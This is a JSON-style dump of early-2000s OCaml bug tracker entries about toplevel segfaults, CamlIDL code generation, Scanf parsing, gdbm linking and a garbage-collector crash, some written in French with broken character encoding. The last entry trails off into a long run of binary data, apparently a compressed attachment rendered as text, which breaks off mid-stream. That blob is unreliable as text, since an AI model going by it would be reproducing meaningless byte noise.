attention\n\nVincenzo\n"},{"labels":["bug"],"text":"**Original bug ID:** 1752\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Craig Falls\nVersion: 3.06\nOS: Debian Sid\nSubmission from: 12-232-69-28.client.attbi.com (12.232.69.28)\n\n\nThe following code generates a segmentation fault in my ocaml toplevel:\n\nmodule Blah =\nstruct\n  type t = int\n  let compare = Pervasives.compare\nend;;\nmodule Intset = Set.Make (Blah);;\nlet x = ref Intset.empty;;\nx := Intset.add 1 !x;;\n\nAttempting to compile the code using ocamlc gives the message:\n\nFiles set_test.cmo and /usr/lib/ocaml/3.06/stdlib.cma(Set)\nmake inconsistent assumptions over interface Set\n\nI suspect this code is malformed in some way and/or my unstable linux\ndistribution are to blame.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1751\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Nicolas Janin\nVersion: Ocaml 3.04\nOS: NT 4 SP5\nSubmission from: vaugirard-2-81-57-130-154.fbx.proxad.net (81.57.130.154)\n\n\nHello,\n\nwhen I type this code on the toplevel of my NT workstation :\n\n# #load \"threads/threads.cma\";;\nReference to undefined global `Unix'\n# #load \"unix.cma\";;\n# open Threads;;\n\nOcaml violently quits, while on my XP computer (Ocaml 3.06) it simply returns :\n\nUnbound module Threads\n\nps : I downloaded version 3.04 because the self-installing executable 3.06\nseemed broken in one of your sites (Pauillac or www.ocaml.org, can't remember\nwhich one).\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1750\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for CamlIDL use https://github.com/xavierleroy/camlidl/issues\n\n## Bug description\n\nHere is an example:\n\nsigned char get0x80()\nquote(call,\"_res = '\\x80';\");\n\nit compiles to \n\nexternal get0x80 : unit -> char\n\t= \"camlidl_signed_char_get0x80\"\n\nand\n\nvalue camlidl_signed_char_get0x80(value _unit)\n{\n  signed char _res;\n  value _vres;\n\n  /* begin user-supplied calling sequence */\n_res = '\\x80';\n  /* end user-supplied calling sequence */\n  _vres = Val_int(_res);\n  return _vres;\n}\n\nbut (int)((signed char)'\\x80') == -1! There is no such char value in\nOcaml (its chars are unsigned) so we are obviously in trouble.\n\nEven worse, many compilers (including GCC and MSVC) assume that char is\nsigned by default so writing \"char get0x80() ...\" we will have just the\nsame problems.\n\nWhat I propose: traslate \"char\" IDL type to \"unsigned char\" C type (as MIDL\ncompiler does) and prohibit using \"signed char\" IDL type (or at least\ngenerate a warning)\n\n- Dmitry Bely\n"},{"labels":["bug"],"text":"**Original bug ID:** 1747\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Laurent Beaudou\nVersion: 3.06\nOS: Linux\nSubmission from: cacheng.unige.ch (129.194.8.73)\n\n\nJ'ai un seul fichier test.ml qui est trÃ¨s bien compilÃ© par ocamlc en Ã  peu prÃ¨s\ndeux secondes.\n\nPar contre si je fais la mÃªme commande avec ocamlopt il ne compile pas (je l'ai\nlaissÃ© tourner 5 minutes mais il avait toujous pas fini).\n\nJ'ai essayÃ© avec des .ml plus petits (et aussi plus simples) et je n'ai pas ce\nproblÃ¨me.\n\nDans mon gros fichier j'utilise les modules Stack, Printf et Array, est ce\nqu'ils peuvent engendrer ce genre de problÃ¨me ?\n\nSi vous le dÃ©sirez, je peux vous envoyer mon fichier de code (donnez moi une\nadresse) pour que vous puissiez le tester par vous mÃªme (j'ai essayÃ© sur\nplusieurs machines et j'ai eu partout le mÃªme rÃ©sultat).\n\nMerci\n\nLaurent\n"},{"labels":["bug"],"text":"**Original bug ID:** 1745\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Wheeler Ruml\nVersion: 3.06\nOS: linux\nSubmission from: katsura.parc.xerox.com (13.2.18.21)\n\n\nScanf doesn't seem to like the floating-point format used by\nstring_of_float.  string_of_float is happy to print nothing after the\ndecimal point, but as the following code demonstrates, scanf will\nraise an exception if the string ends directly after the decimal\npoint:\n\nlet scanf_test () =\n  Printf.printf \"got %f.\\n\" (Scanf.sscanf \" 24. \" \" %f\" (fun x -> x));\n  (* now no space after the point *)\n  Scanf.sscanf \" 24.\" \" %f\" (fun x -> x)\n\n\n# scanf_test ();;\ngot 24.000000.\nException: Scanf.Scan_failure \"scanf: bad input at char number 4: bad int\".\n\n\nI suppose one could argue that string_of_float is matched with\nfloat_of_string and scanf is supposed to be matched with printf, and\nthe two pairs shouldn't necessarily be combined, but it seems like an\nunnecessary incompatibility.  \n\n\nThanks for some great software!\n\nWheeler\n"},{"labels":["bug"],"text":"**Original bug ID:** 1744\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Boris Yakobowski\nVersion: 3.06+37\nOS: Linux\nSubmission from: lcultra.macs.hw.ac.uk (137.195.27.64)\n\n\nIl semble qu'il y ait une rÃ©gression involontaire au niveau de ce qui est\nacceptÃ© par le typeur en types polymorphes :\n\nboris@elrond ~\n$ ledit ocaml\n        Objective Caml version 3.06+37 (2003-06-30)\n\n# type 'a t = 'a;;\ntype 'a t = 'a\n# type 'a u = A of 'a t;;\nConstraints are not satisfied in this type.\nType 'a t should be an instance of 'b t\n# \n\nAmicalement,\n\n-- \nBoris Yakobowski\n"},{"labels":["bug"],"text":"**Original bug ID:** 1742\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nSalut, ...\n\nLa version de debian de gdbm utilise avec ocaml est gdbm 1.8.3.\n\nCette version, a part utilise l'include gdbm-ndbm.h a la place de\nndbm.h, a aussi besoin d'utiliser la librairie libgdbm_compat pour\nutiliser les anciennes fonctions de compatibilite dbm et ndbm que ocaml\nutilise.\n\nJ'ai fait un patch pour le package ocaml, mais il est pas tres propre,\nalors peut-etre voudrez vous faire un fix correct pour la future version\nocaml 3.07.\n\nPour cela, voici les informations qui sont utiles :\n\nle fichier d'include se trouve dans /usr/include/gdbm-ndbm.h et la\nlibrairie a utilise est /usr/lib/libgdbm_compat.[l]a.\n\nPour cela, je pense que le mieux serait de tester l'existence de\ngdbm-ndbm.h si ndbm.h n'existe pas, et si on trouve gdbm-ndbm.h, faire\nle test \" sh ./hasgot -lgdbm_compat dbm_open \" avant de mettre dbm_link\na \"-lgdbm_compat\".\n\nCela devrait bien marche, mais il y a encore un probleme, et c'est le\nfait que otherlibs/dbm/cldbm.c a un include de ndbm.h alors qu'il faut\nutiliser gdbm-ndbm.h.\n\nSi vous n'avez pas le temps pour cela, je peut essayer de faire un patch\nla semaine prochaine.\n\nAmicalement,\n\nSven Luther\n"},{"labels":["bug"],"text":"**Original bug ID:** 1741\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1739\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for CamlIDL use https://github.com/xavierleroy/camlidl/issues\n\n## Bug description\n\nLet's consider the following example:\n\n[--- unique_intf.idl ---]\n[\n    object,\n    pointer_default(ref),\n]\ninterface ITest: IUnknown\n{\n    HRESULT f( [out,unique] ITest** i );\n};\n[--- end of unique_intf.idl ---]\n\ncamlidl generates\n\nclass iTest_class :\n  iTest Com.interface ->\n    object\n      method f: iTest Com.interface option\n    end\n\nthat's OK, but in C stub it forgets about \"unique\" attribute (option type)\nand therefore the segfault happens:\n\nHRESULT STDMETHODCALLTYPE camlidl_unique_intf_ITest_f_callback(\n\tstruct ITest * this,\n\t/* out */ struct ITest **i)\n{\n  value _varg[1] = { 0, };\n  value _vres;\n  static value _vlabel = 0;\n  HRESULT _res;\n  struct camlidl_ctx_struct _ctxs = { CAMLIDL_ADDREF, NULL };\n  camlidl_ctx _ctx = &_ctxs;\n  Begin_roots_block(_varg, 1)\n    _varg[0] = ((struct camlidl_intf *) this)->caml_object;\n    if (_vlabel == 0) _vlabel = camlidl_lookup_method(\"f\");\n  End_roots();\n  _vres = callbackN_exn(Lookup(_varg[0], _vlabel), 1, _varg);\n  if (Is_exception_result(_vres))\n    return camlidl_result_exception(\"unique_intf.ITest::f\", Extract_exception(_vres));\n  _res = S_OK;\n  *i = (struct ITest *) camlidl_unpack_interface(_vres, _ctx); /* forgot about \"unique\" so segfault here! */\n  return _res;\n}\n\nI have made the following quick fix (or hack :-) that looks like solving\nthis problem:\n\nIndex: intf.ml\n===================================================================\nRCS file: /caml/bazar-ocaml/camlidl/compiler/intf.ml,v\nretrieving revision 1.22\ndiff -u -r1.22 intf.ml\n--- intf.ml     2002/01/16 09:42:02     1.22\n+++ intf.ml     2003/07/03 02:40:31\n@@ -283,6 +283,8 @@\n   let convert_output ty src dst =\n     match (dst, scrape_const ty) with\n       (\"_res\", _) -> ml_to_c pc false pref ty src dst\n+    | (_, Type_pointer(pty, Type_pointer(_, Type_interface(modl, name)))) ->\n+        ml_to_c pc false pref (Type_pointer(pty, Type_interface(modl, name))) src (\"*\" ^ dst)\n     | (_, Type_pointer(_, ty')) -> ml_to_c pc false pref ty' src (\"*\" ^ dst)\n     | (_, _) ->\n         error (sprintf \"Out parameter `%s' must be a pointer\" dst) in\n\n\nNow we have\n\nHRESULT STDMETHODCALLTYPE camlidl_unique_intf_ITest_f_callback(\n\tstruct ITest * this,\n\t/* out */ struct ITest **i)\n{\n  value _varg[1] = { 0, };\n  value _vres;\n  static value _vlabel = 0;\n  HRESULT _res;\n  struct camlidl_ctx_struct _ctxs = { CAMLIDL_ADDREF, NULL };\n  camlidl_ctx _ctx = &_ctxs;\n  value _v1;\n  Begin_roots_block(_varg, 1)\n    _varg[0] = ((struct camlidl_intf *) this)->caml_object;\n    if (_vlabel == 0) _vlabel = camlidl_lookup_method(\"f\");\n  End_roots();\n  _vres = callbackN_exn(Lookup(_varg[0], _vlabel), 1, _varg);\n  if (Is_exception_result(_vres))\n    return camlidl_result_exception(\"unique_intf.ITest::f\", Extract_exception(_vres));\n  _res = S_OK;\n  if (_vres == Val_int(0)) {\n    *i = NULL;\n  } else {\n    _v1 = Field(_vres, 0);\n    *i = (struct ITest *) camlidl_unpack_interface(_v1, _ctx);\n  }\n  return _res;\n}\n\nthat matches the definition.\n\n- Dmitry Bely\n"},{"labels":["bug"],"text":"**Original bug ID:** 1736\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nDear caml team,\n\nDuring the development of ocaml-expat a wrapper for expat (an xml \nparsing library) I found an interesting problem. A user of ocaml-expat \n(Alain Frisch) reported a bug which I could not reproduce immediately. \nIt was obviously related to garbage collection, but I could just not \nreproduce it on my computer. That is until I upgraded from ocaml-3.04 to \nocaml-3.06...\n\nI've attached the most recent distribution of ocaml-expat, and a small \nprogram (provided by Alain) which runs fine when compiled with 3.04, but \nsegfaults after a short while when this is done with ocaml 3.06.\n\nWhen I run the program under gdb (after compiling with -custom) I see \nthat it segfaults inside 'mark_slice()'. I'm not sure how to proceed \nanymore. I've gone multiple times over my code, and I think that I stick \nto all the rules. Could this be a bug in the GC? If this is not the case \nI would really appreciate some input on how to proceed further.\n\nThanks in advance,\n\nMaas\n\n----------------\n\u001fâ¹\b\u0000xÃÃ¼>\u0000\u0003Ã¬<kwÃÂ¶âÃ½\u001aÃ¾\n\u001cÂ§g#Ã¹ÃÂ´$Â¿\u0012Â¥Ã®Â¹Å ,Â§Âºâ¢%Â¯$Â·Ãv{TÅ â,n(Râ\u000f?ÃÃ­Ã¾Ã¶?\u0019\u0000$(QÂ¶ÅÃªÂ¦ÃÂ½fb[\u0002\u0006Ã³\u00020\u0018\f\u0006\flkÃ®Ã­Ã±Â»â¦\u0015Ã¯UÃÂªyÂ´Ã¿ÃÃÅ¸jÃµÂ°zrt\u0004Â«ÂµâÂ£ÂªÃ¾W=_UOÅ½ONjâ¡'ÂµÃ£âÂ¯ÂªÂµÃºaÃµÃ°+vÂ´}VVÅ¸$Å Â­?Â±Â¯Ã¦â\u0015=\u0004Ã·XÃ½_Ã´\tVÃºÃ\tÃ¬-??Â§Ã·Ã¿AÃ­Â¨Ã¶ÃÃ¿_Ã¢)Ã®Ã¿AÂ»yvÃÃ\u0016?jÂ­Z=><\\ÃÃ¿86Â Ã¿\u000f\u000ea\u0000\u001cÃ\u0000Ã¾\u0010Ã¾ÃÂªÃbÃ Â¡Ã§_Â¼Ã¿\u0007â°ÃvÃ¦Ã'ÃÂ ÃwX\u001cÂ°kÃ®Ã³ÃÅ 9â¹gTËÃÂ¹\u001f[Â±\u001bÃ¸ÃÅ¸ÃÃ¬Ã³Â³ÃµguÃ¾ÃgsÃ®m?ÃÃÃ³Â¿V;:Â¨â¹Ã¹\u000fÅ¸\u000eÅ½\u000fhÃ¾\u001f\u001e=ÃÃ¿/Ã±âvÂ·Ã³â?Ã.\u001b?ÃÃ¨Ã£â¬jÃ£\u0018bÅ¾;\tÂ­Ã°Å¾=Ã©\u0011ËÂ¶Ã±\bLÂ­`q\u001fÂºÃÂ³ËÃÂ«Ãz\u0005\u001fÂ°\u000bÃ¨Ã=Ã¸\u0015ÃÃgÃ¿ÃÃ¹ÃÃ²MÃÃ´<F?\u0011\u000byÃÃ\u001bÃ®ËlÃ9bbËÂªÃiÂµ{Â­6âº\u0006!sxlÂ¹^d~\u0016SÃR92ÃµuÃi05g+7Â¬fÅ¾?ÅÃ»ÃÃ£Ã½Ã\u0011|lÃ_7\u000eÅ½\u0018Å½_\u0006Ã½ÃÂ¾F\u001eÅÃ¸~ÃEÂ³Ã±Ã\nAZYt7Ã·Ã<\fAÃS\u0003Ã¹Ã­Ãµ{mÃ¸Ã°ÃÃ°a|ÃÂ¾Ã¨\u000f>ÃÂ·Ã¡ÃÃÂ¨Ã¹AUÂ´Â»Ã­â¹vo4Â¤Ã¯?Ã\u000fÃnÃ§l<ÃªÃÃ®QÃUÂ¯ÃÃ­\u000fÃzÃes0Ãª4Â»Ã£ÃwÃ\u0001\u0015ÅÅ¡Ã¯Ã\u0017?Ã¡EsÃÃºÅ½\nÃÂ®.AÃÃQ{Ã\u001c?\u0006?wW#ÃÃÃÂ¯zÃ?âºÃ§Â£Ã¶`|Ão)Ã\niÃ³b\fÃ:Â£?Ã£AÃ»\\\u0012?kÅ¸wz@]TPÃ¡Â ÃÂº\u001a\f;?Â´âÂ¡âº XKâ¡|Ã<#&SËw?^sÃ°qÂ¥?Ã¢qÃÃ¾\u0000Â¬Ãµ@Â´%\b\u0010Ã®Â²Ãl\u0001\u001f\u001f.ÂºÃ£ÃÅ½dÃ®Ã»^Ã¿Ã\u001eÃÂ¶Ãºg?Ã{Â©ÃV\u0000\u001cÅ½Ã²ÃÂ©\u0016[gÃQs<\u0004â¬N_hsâ¢Ã¦wÃÃYWÂµÃ«ÃµGÃ£Ã¡\bJÅ¡]ÃâWÂ½Ã¶â¡Kh\u000fÃÂ F*VÂ¶=kÂ·ÂºÃ\u0001ÃtzÃ£KQsÃnÅ½Â®\u0006m\u0010Ã¥ÃÂ¯:ÆÃ¶?$8\u001b?QeÂ«Ã\u001bÂ¡â zÃ¯Ãc\u0005Ãâ¡Y2â Ã\u0018\"\u000f\u0006Â¿Â³Ã¹\u0002Ã½\u0007FfA\u000eÂ¯`Å¡?5ââ°yÃ¨[^V6Å½Æq\u0014â¡Â®Ã\u001aÃÂ¨ÃÃ»âÃÃSÂ¶#Ã/rÃÃÃ!UÃ¬ÃÂ´ÃËÂº\u0011Â³â0\u0004'ÃÂ»\u0007Ã¿&`sÃwÃ§âÃ§FÂ±kWÃ$â°â¢\u001bÂ¿Å ËÃp%Ëqvx<fc ÃÂ²<obÃÅ¸Ã?_\u00038\u000fÃ\u0019ZIÅÂ¸Ãa%]4Å3`1?\rË[ÃÅ\u0001m7Â¾g3Ãw<d\u001dHÂ¤â? Ã\u0002âÂ¦\"\u0000ÅÃ­YÃ Ã\\MÃÃ¶\u000fÃ­?Ã¬Â·n{8\\Ã®ÃfÃ·ÃÃ¦ÃÂ¡Â¦ÃËÃâ¦hY#7Ã£Qââ¬Ã 1&\u0000j\u0012\u0004Å¾dFÃÃ¹?ÃâÃÂ®MÃ.E+Â¡Ã½?ÃIÃ¨â\u0007yÃÂ¡\u001cÃ´Ã¥'Ã³\tÂ§nÃRÅ¾[ @\u001f)Ã³\u0002Â¿jÃ`â°Ã¯Ãk{\u001d?Ã½ @\u0005a\u001bz,B/Ã\u000e9ÃºÂ°\u0016âÂ²Ãª$DÃXââ¬R|;p\u0000yCÃ\u0000j9=?Â¢Å¡4Â²âTÃÂ¢Ã¦;kÃÅ½Ã½Â¨\u0018sÃQÃq\u00106Ã¬â¢\u0015>â°VoÂ¨\u000bÃ©sÃ®p\u0007eÂ¥Â¦Â«\u0012\u0016twÃ\u0006Â©Ãµtâ¢ÃÂ²<Ã£(â¢<ËÃÃµcÃ­?D[ Ã0â¢hÂ¸Â§.Ã¾^Ã+Ãk?Ã\u0011RÃ-Ã¦'Ã·8Ã®HÃlâVB\u001bÂºÃ´8Ã¾\tv,aÃ\nÂ¶p\u0002â2aÃÃ])`â¢Â¡â¢PÅâ¢Ã³\u0012.Oâ !âl\u000bÅ Ã\tâÅ¡ÃÃ¨RlÃVÂ¡\u001e\u0007ËÂ¢?\nY<ÃÃP7\u0000Â¹\u0001\u000bÂ¥Ã¼`)Â¯e\u000bDoÃ»Ã#âoFsÂ½Ã\u0005\u0014h*Ã\u001cÂ²lÂ Ã\u001c+Â¶\u001eâ;\u0005\u001e#Ã°âDo)Â¤gâ¬s?Ã´\u001bS^Â¯â¬b:Â´Ãâ?Ã#2Ã°Â®\u000fÅ'6-P\u000fÃ«\"k4Ã\u001am<QÃ*Â¨hâHIu2JÃ«4ÃµdÂ¾RÂ²Ã\n{Ë,\rÅ¾`Å¾âº-+Ã£EÃÃ@Y\u001d'\u0002ÃÃ\u0011Ã²(Â­Âµâ.cÃLÂ¥?âº\u0014Ã&Ã~l.Â¨\u0005Ã¸1\u0001Ã0Âµ\u001eÅ¡\u0005âº\u0011\\+g\u0001\u0001eÃ·\u001e\u0016\u0014mÃÃÃ\u0004CÃ´Â ?âº\u0010[+Ã¢\nr\u0014ÃÃ¡S+Ã±Ã\u000fSYÂ¿?az&?Â­âÃ®qZke[Ã,Â¼tÃ¥Ãµ\t\u000f9Ã¤ÃÃµÂ½(Â¿(7\u0015`73W?pÃ3Â«ÂµRPTâ¢*Å ,ÃÂª_âCAr$\u001cÃ \u0001Å¸Â®\u001d\u0013ObÃ½I\u001aÅâ9â![Ã¥?Â²$\u001cÅÃªUÂ»?vFlâ¦Ãâ{Ã°Q]ÃÃ¡w\u0005\u001cÂ 3Â·Â¼\bÂ½\u0007C#ÃÂ¾ÆÂ¦\u001dlÂ¹SÅÃ\u000eÂ¼dÃ®?Â¥ÃÃ¿TÃ¬-jÃÂ£Ãk\bÃ\u001eÅ .Ãº.Â´}\u00109)Ã\u000e\u0012ÃÃ²9Å iaKÃ¨\u001aÃ£/\u0012,_?Ã¿^XÅ¸Ã¸ÃÃµÃ¸Ã¶h<rÃ¾s\bÃ¿0Ã¾\u000bÃA\rÃ¾RÃ¼Ã·Â Ã¾\u001cÃ¿Ã½\u0012ÃKÃ£Â¥\b!ÂªnÂ§\u0010bÂ­Å¡Ã\u0010Â«uVÂ«5j'?Ãk=â hÂ¼4Â %8Â¥Ã¾5Å¾\u0014Â¹Â´Ã©Å¾[Â±=cÃ·A\u0012Ã\r>Âºp`â Ã¨Ã´Ã4Ã\u001f.âºÂ£qÂ·Ã³Ã®tÃÂ£ÃºÂ¬Ã¤Â¬38ÃOÂ¢pÃÆ\u0001Ã©Ã­{Ã®DÃuzÂ­Â¥:ÃÂ·Â½ÃÃ¡HÃ¾Ã\u0019\u000f9\u0012ât(Â´ Æ\n&{wÂ¯âÃ\u0006Ã«Â·`ËÂ¿Å Ã/Ã²\u001d+tÃÃÆÃ£â Ãâ ÃÃ¸Â½itzÃQÂ³ÃErÂ¿|]ÃªÂ·Å¡\u0017Ã\u0016Â¬\u0000Â·HÃ¤\u0017$wÃ®YÃ\u0011EâN\u000bÃ½Ã\u0005h,4?ÃyÂ·Ã¹~xÂºwv~ÃÃ­Å½Â¯zÆ~Â·ÃÃ¶ÃºuÂ¶ÃÃ¹ÂºÂ¤\u000bR\u0006</_2XÃ§1\u0012b\u0007Ã¾ÃÂ½NBÃ\u000f,rÃ¤Â¢\u001a\u0006â\u001e\\ÃµNirâ â°/JZÃ¢Â»-Â¾Ãµ/GÃ¢;,YÂ¢Ã¤Â¬})J\u001cÂ¾0.Â¾G=ÃÃÃ¹'TÂ§\u0000Ã©K$N`\u001bFkÃÃ·Ã·Ã¡Â©0eQÅL\"3â¬Râ¬Ã*L{\u000eâ¦Â \\\u0015eÂ¶Ã§nÃºÃbT\u0005,\u0014ÃÃYâ \u0011Ã³(\u0016A\u001cÃ¼Ã^\u0018/Ã}Ãµ?*Â©Â­*1Q\u0018\râÂ¾Ã£\u0007Â¢O\u0018d\u001bÃP0Zk`ÂµËÃ\u0017Z\u0006\u00197Ã°Ã¡Å½\u00002ÃÃ \n*\tâÅ½5Â£fÃ¦Ã¹\u0005!â¹\u0005W\u0014Â¡âºr4Â±=ÃÂ³mÃºÃ5\u0015\u000bwâÃ8eÃ¢.GÃ0Â \u001fÃ§bÃ¦ËVÆ}]\u0012\u001dXFbÃÃHÃf\u0012$Â«\u0007Bj\u0014Å Â©VfÃÃ·2F\u000eÂ¥Ã¸\rÂ¦â@\fj0Ã¤â°Â°âBZÅ¸#Â½)ÃÂ»\u0007(6PÃ±Â§\bÃ´\u0018m\rÃ²I\\ eÃwQâÃ´7XV$\u0014ÃÅ¡\u0017â A\u001fR\u001dQ;&Ã\u0002ÃµÃÃsÅ¡!@Ë\u0014Â¥aH{ÃÃ\u0006Å¾>vÃ¬EÃ¡0VÂ§<.Ãâ\u0019Â«2Ã/i1WÃ­NÃÃÃâº2ÃÃ³\u0014X\u0014Â¼E;Ã¦3h?+Ã7ÃÂ¦n\u000eEÃhÃ^\u001bÂ»Ã©GVÃ\rÂ¡3ÃÃ¼4ÃyÃj\u0003Ã³\u000ef\u0019Â¼erÃâ¬â°\u0002ÃÃÃ¢Â¹\u0007Ãââ¢&Ã¼O?Â¤Â¡%5j\u0018â 9Â¼:?Ã¯|h\u000f\u001b\f*\u0018iâ¦Â´L:\u0013Ã\u0005\u000bÃ±k#7Ã¿m\u001c:Ã½â¹K2Ã0$Â¾A8lÂº\u0019Ã]cin\u0017\u0000ÃÃ¦\n29Ã¥w\u0000V\u0000Ã® Â¤Ã­qÃo\u0000l8GÃÃ®Ã¾\u000fÃ\u0005\u0012Â»Ã°;â¬\u001f\u000b~Â ;0!gÃ$?Ë?v\u0014Ã¥lXf*ÃÃ²ÃÃ¾\u0013Ã°]Ã@Ã²Ã¢\u0002ÃÂ±oâ¢)ÃSâ`Â¥(C\u0015Ãª\fÂ³o3\u0010Â¹ÂºÂ¦ÃÃ¿lÃ¿Ã¤Ã¹Ã¹Ã§>Ã«Ã³?ÃÂ­Ãx$Ã¿Â£^ÃÅ\u000fâ¢Ã¿uDÃ¾Â½Ã¾ÅÃ¿Ã±EÅ¾Ã§Ã¼?Ã¿OÃ¹\u001f.Ã­ÃÃd\t ÃÂ¬Ã¶Â¦Q?n\u001cÂ¼^N\u0000\u0001.Â²Ã¾bÃ¹\u000e[âÃ?Ã«Ã°ËY>â <x8ÂµlÃgÃ¡Â¾Gâ¬~Â¸Ã¨2q6i\u001a\u0014!\u0013Ã.Å¾Â£K4\u0015v\u001bÃ¢ÃÃ¤Â³Vâ¦tÂ¦Å½Â¡Â±Â­J,\u0004\rvÃ°Ã´\u001d0Ã@âºÃCÃ¯\u001eÃÂ°ÃEÃ°Â«\u000bÃ»Ã\nÂ»âR\u0000Ã»\tÃ6\u001aâÃ°ÃPz\u001fÃ\u0002Ã¿UDMÂºÆ\u0005ZÃjLR\b\u0000XÂ¸Ã\u0002Ã!\u000b`9c\u0011lMA\u0012d@\u0000\u0002yÃÃ¾\b\\Ã´HÃ®dSÃ¾=ÃÃ¿ÃnÃx&ââ¬@BÃ¬Ã2Å¸Ã¬gQ\u0003ÅÃ¦ pÂ©Ã|Â¢Å¸%?Â¿Y\tÂ°\u001b\u0016?>fÃ¨}BÃ\u0001?tÂµ\u0014Â§iÃ@>k\u0007ÃÃ¼v$Ã»âÃA1l\"OÃ»Â¸Â¥\u000eÃ}~Â«\t\u000ejÅ¸Â¦ÃÃÃm~\u0000,Ã\u00171ËÃ­Ã,ZpÃ?Âº\\hÃÃÃÃÃ6Â±ÃËÃ\u000eÂ«\u000e5A\u0002@\u0017ÃÃ°0Â¤1Â¤zV\u0001d\u0018\u001cn{âÃÃ¼Å¡rÃ¼Ã,Ã`'!âº$Â®â¡Ã±Æ\u0014:2E'_\rÃ·Å¡ÃVÂ§\u0003?Ã»ÃÃÃ¨|Ã¯ÂµÃºP;ÃO?aÃ¯ÃµÃ«Â£7{ÂµÅ¸Q\u00057O?Ã®Pm ?Ã¤ÃÂ·Ã¦<ZÃ Â¼Ã?Â¿1>?Ã>Â¾?Ã¶gÃ¦\u0004Ã¤Ãº\u0018Zd}ÃÃ¥1Ã©^Ã²&NÃ½Â±Â³\u0012\u0018Â·0~`\\Ã©sÃ\u0014ÆÃ´oÂ¡Ã¥F<âÅ#~Ã«<?Å¡<Ã°Y\u001cÂ â,\u0016%\u0013?ksv>#\rA0ÃÃ±aâ¬Ãu\u001eÂ©\u0007)\u0007Ã?Ã0\u001bÂ¸ÃÂ«\u0013\u000eSâ\u0000ÃÃ¶âÃÂ¿y$[!Ã­\u001d\u0019ââ¡\u0015#Å½â)4=\u0014Â¶?Â©ÃÃ\u0004Ã Ã\u0016\u001cGâ\u000b+DÂ®Â¢HÂ¤q OÃ²T Â¢*ÃÂ»ÂµÃ®#1`\u0000ÃÃµ\r5Ã¤MÃ¶\u0011'â°ÂµXxÂ®mÂ©4'XÂµ\u0016?\u001fÂ¹\u0013ONÃÃÃ²#\u0011|ây7\u0011LEÃ\u0001Â¨*?Â¶QÅ¸cjlÃ½vÃâ Â¹|â¹Hâ+ÃÃ¤BÃ¸âº/âtAd>#?\"â¢Â§Â­eHl Ã\u001fLâÃÃ}BÃ²CÃlk5Â³\u0001>oÃÃ¶\u001fÃrÃ8RÃ¢BÃ{vÃ´Ã:\u0005\u0019\t\u001b\bÃ±ÃIOÃ\u0004Ã»Â¬<ÆÂ¬sâ2\u00076Ã©âÃN&ÃÂ»cÂ£,?ÅM<K\u0006ÆÃ´dÃµÃ¿âÃâ¬â¢iÂºÃix~ÃÃ½aÃâº\u001eÃÂ§Å¡âGÂ«Â©\u0011Ã@GÅ¸Ã¬Â®1ÂºÃyzfÃÃâ°Â¥8râ ÃµeÃº\u0014â\u001f>â¡Â¦ÃÂ¸`^Ã¡Â³Â­Â³Ã´\u0017Ã\u001dÃµÃ¤âÃ±Â¼ÃÃ.ÆÃ%2Ã§â°OÃ<ÃD~ÃyÃ·JÆ\rNÂ±WÃ<z0]ÃÃ\u0003Â§ÃÂ©Â´âÃ \fÃ½Â½\bÃÂ¬_ÃfÃ¬Â³Ã§âÃ½Ã§âÃ½??Â²?ÆÂ®?Â¦ÂºâÆÃ®Â°ÃÂ½Ã´Ã¯Â§rÂªÂ¡Ã\u001aÃËâ\u001eÂ»\u001dÃ¸\u000eÃFâ¢wÃ²xÃ?mÂµ\u0002\u001f6â¹1F\u000eÂ²Â±\fÂ¨-eHÃ¤F`Ã³Â«\u0001,?6\u0017ndsÃÂ³|\u001e$ÃÂ²?@\u0018Ã`Ã§bcâºOÃÃÃâ¢mÂºÂ·âºÂªOÃºÃµ-tÃÃÃâ,Ã¦T\\\u0018ÃÃ¸q\u0005\u000bÂ©[TÅÃ_hÂ¹7ÃÃ«\u0017Ã\fÂ²âÃ½|(H%Ã¢[QÃ\u001f%n^âº*\u0005Â¦fÂ¾92k;Å KQÂ¸.}ÃÃ¸Ã«$ÃÃ¼â¹<Â«Ã±\u0019Ã¥Ã\"?GÃ²ÃªÂµ\u0003ÂºÃ¿]=>Â®\u001d\u001f\u001f\u001cÃ¢Ã½Ã¿ÆÂ£âÃ§Ã¸Ã¿âxÂ²Ã°xÃ.Ã«!rÂ°Ã¶\u0005qJÃ\u0018âÂ½Â²?YÃÅiÆâ¡Â®YÂ¥Â¸Å \u001bâºâ qÃÃÂ¹\u001bE2`?â¢5\u0000z\u001dZ~Ã?\nâºâ ÅÃ¢Å¾Â¸Ã«Â¼Ã¦\u0015Z\u0004|XuÃÅ¡`\bc\u0012[Â®?VÃ\"R\"Â¦\u0001hÃ\b\u000eÂºÂ¾hÃtÂ¾Â¢`\u001aÃb4Â¥Â´ÆUCÃ¹uÂ§\\1\u0000Â½ÃÃfÂ¹ÃÃ°Â©*Å Ã¸\u0006IÅ.*X-Z1*L\u001cÅÂ¢Ã¹âÃâ 